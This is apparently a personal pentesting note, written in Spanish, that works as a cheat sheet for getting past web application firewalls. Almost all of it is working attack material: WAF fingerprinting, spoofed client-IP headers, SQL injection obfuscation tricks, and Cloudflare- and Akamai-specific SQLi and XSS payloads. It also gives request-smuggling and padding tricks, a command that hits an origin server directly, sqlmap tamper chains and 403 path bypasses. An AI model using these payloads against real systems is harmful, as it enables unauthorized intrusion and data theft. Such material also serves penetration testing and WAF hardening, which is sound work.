---
tags: [web, waf, bypass]
status: done
---

# WAF Bypass

---

## Fingerprint del WAF

```bash
# wafw00f — identificar qué WAF hay
wafw00f https://target.com

# Respuesta manual: mirar headers de respuesta en petición bloqueada
# Cloudflare:  CF-Ray header, respuesta 403/1020
# Akamai:      AkamaiGHost, Reference #...
# AWS WAF:     x-amzn-RequestId
# Imperva:     X-Iinfo, _imp_apg_r_
# F5 BIG-IP:   TS + hash en cookie
```

---

## Bypass de IP / Rate Limit

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 1.2.3.4
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

---

## Bypass de Firma / Pattern Matching

### Case Manipulation
```sql
SELECT → SeLeCt → sElEcT
UNION  → uNiOn
script → ScRiPt → SCRIPT
```

### Comentarios SQL
```sql
SELECT/**/username/**/FROM/**/users
UN/**/ION SEL/**/ECT 1,2,3
/*!UNION*/ /*!SELECT*/ 1,2,3   -- MySQL inline comment
```

### URL Encoding
```
UNION → %55NION → %%55NION (doble encoding)
/     → %2F → %252F (doble encoding)
<     → %3C → %253C
```

### Unicode Normalization
```
# El WAF ve %ef%bc%8f → no lo bloquea
# El servidor normaliza %ef%bc%8f → / → ejecuta
ｓｅｌｅｃｔ  (fullwidth chars) → normaliza a "select"
＜ｓｃｒｉｐｔ＞  → <script>
```

### Whitespace Alternativo
```sql
# Si filtran espacios
SELECT%09username%09FROM%09users    # Tab
SELECT%0Ausername%0AFROM%0Ausers    # Newline
SELECT%0Dusername%0DFROM%0Dusers    # CR
SELECT(username)FROM(users)          # Paréntesis
```

---

## Bypass de Tamaño / Buffer

```
# Muchos WAFs dejan de analizar tras N bytes → meter junk antes del payload
GET /vuln?padding=AAAAAAA[x8000]&payload=INJECT

# Chunked Transfer Encoding — el WAF ve el body fragmentado
Transfer-Encoding: chunked
→ herramienta: smuggler.py o Burp Extension "HTTP Request Smuggler"
```

---

## HTTP Parameter Pollution

```
# El WAF analiza el primer parámetro, el servidor usa el segundo (o combina)
?id=1&id=1 UNION SELECT 1,2,3-- -

# En PHP: $_GET['id'] → toma el último
# En ASP: Request['id'] → concatena con coma
?id=1&id=UNION&id=SELECT&id=1,2,3--
```

---

## Bypass Específico: Cloudflare

```sql
-- SQLi que pasa Cloudflare (2024)
' /*!UNION*/ /*!SELECT*/ NULL,NULL-- -
' UNION%23foo*%0D%0ABar%0D%0AContent-Length:+41%0D%0A%0D%0A SELECT 1,2,3-- -

-- XSS que pasa Cloudflare
<Details Open OnToggle=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
```

```
# Rutas: Cloudflare no bloquea si la ruta no está en el WAF scope
# Probar: origin directo (IP del servidor sin pasar por CF)
# host: target.com → nslookup/shodan para encontrar IP real
curl -H "Host: target.com" https://[IP-REAL]/vuln?...
```

---

## Bypass Específico: Akamai

```
# Akamai analiza solo ciertos headers y body parcial
# Añadir headers largos para consumir buffer de análisis
X-Custom-Header: [padding largo]

# Fragmentación de payload en múltiples parámetros
?a=UNION&b= SELECT&c= 1,2,3
```

---

## SQLMap Tampers para WAF

```bash
# Tampers más útiles
space2comment      → SELECT/**/username
between            → NOT BETWEEN 0 AND X en vez de >
charencode         → URL encode de chars
randomcase         → SeLeCt
equaltolike        → = → LIKE
greatest           → > → GREATEST()
ifnull2ifisnull    → IFNULL → IF(ISNULL())
unionalltounion    → UNION ALL SELECT → UNION SELECT

# Combinar varios
sqlmap -r req.txt --tamper=space2comment,between,charencode,randomcase --random-agent --delay=1
```

---

## Bypass de 403 en Rutas

```bash
# Path manipulation
/admin      → bloqueado
/admin/     → ¿pasa?
/admin/.    → ¿pasa?
/%2fadmin   → ¿pasa?
/admin%20   → ¿pasa?
/ADMIN      → ¿pasa? (case)

# Headers que algunos proxies respetan para routing interno
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1

# HTTP method override
POST /admin
X-HTTP-Method-Override: GET
```

